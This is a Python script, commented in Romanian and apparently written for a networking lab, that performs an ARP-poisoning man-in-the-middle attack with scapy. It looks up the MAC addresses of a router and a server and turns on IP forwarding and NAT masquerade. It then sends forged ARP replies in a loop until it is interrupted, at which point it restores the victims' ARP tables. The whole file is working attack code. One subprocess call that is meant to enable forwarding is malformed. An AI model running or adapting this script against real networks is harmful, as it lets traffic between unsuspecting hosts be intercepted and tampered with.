from scapy.all import ARP, send, sr
import subprocess
import time

# face broadcast cu cerea arp pentru a afla mac-ul
def getMac(ip_address):
    # sr =  send-response (Middle il intreaba pe Server/Router care e adresa lui MAC)
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
    for s, r in resp:
        return r[ARP].hwsrc
    return None

# repara tablea arp a victimelor
def stopAttack(gateway_ip, gateway_mac, target_ip, target_mac):
    # "pdst" si "hwdst" - destinatia
    # "hwsrc" si "psrc" - informatia transmisa corect de data asta
    send(ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac, psrc=target_ip), count=5)
    send(ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac, psrc=gateway_ip), count=5)
    print("Poisoning incheiat.")

# permite trecerea pachetelor prin middle
def enableIpForwarding():
    subprocess.run(['ip_forward=1'], shell=True, check=True)
    subprocess.run(['iptables', '-t', 'nat', '-A', 'POSTROUTING', '-j', 'MASQUERADE'], check=True)
    time.sleep(2)

# nu permite trecerea pachetelor prin middle
def disableIpForwarding():
    subprocess.run(['ip_forward=0'], shell=True, check=True)
    subprocess.run(['iptables', '-t', 'nat', '-D', 'POSTROUTING', '-j', 'MASQUERADE'], check=True)
    time.sleep(2)

def poisonArp(gateway_ip, gateway_mac, target_ip, target_mac):
    enableIpForwarding()
    try:
        # trimite pachete false pentru a ma pune in mijloc si a intercepta pachetele
        while True:
            # "op=2" - reply (adica noi trimitem raspuns catre Router si Server)
            # "pdst" si "hwdst" - destinatia
            # "hwsrc" si "psrc" - informatia transmisa de noi
            # "hwsrc" - standard adresa MAC de unde a fost trimis mesajul
            # "psrc" - raspunsul nostru unde in loc sa spunem ca suntem Middle, ii pacalim spunand ca suntem Server/Router
            # => Router-ul extrage adresa MAC din mesajul ARP care e a Middle-ului si o pune in "ARP table" ca fiind adresa MAC a Server-ului
            # => Server-ul extrage adresa MAC din mesajul ARP care e a Middle-ului si o pune in "ARP table" ca fiind adresa MAC a Router-ului
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
            time.sleep(2)
    except KeyboardInterrupt:  # ctrl+c pentru a opri atacul
        stopAttack(gateway_ip, gateway_mac, target_ip, target_mac)
        disableIpForwarding()



if __name__ == "__main__":
    gateway_ip = "198.7.0.1"  # Router
    target_ip = "198.7.0.2"  # Server

    # extragem adresele fizice
    gateway_mac = getMac(gateway_ip)
    target_mac = getMac(target_ip)

    if gateway_mac is None:
        print("Nu am putut gasi mac-ul gateway-ului.")
        exit(0)
    else:
        print(f"Gateway MAC: {gateway_mac}")

    if target_mac is None:
        print("Nu am putut gasi mac-ul target-ului.")
        exit(0)
    else:
        print(f"Target MAC: {target_mac}")

    poisonArp(gateway_ip, gateway_mac, target_ip, target_mac)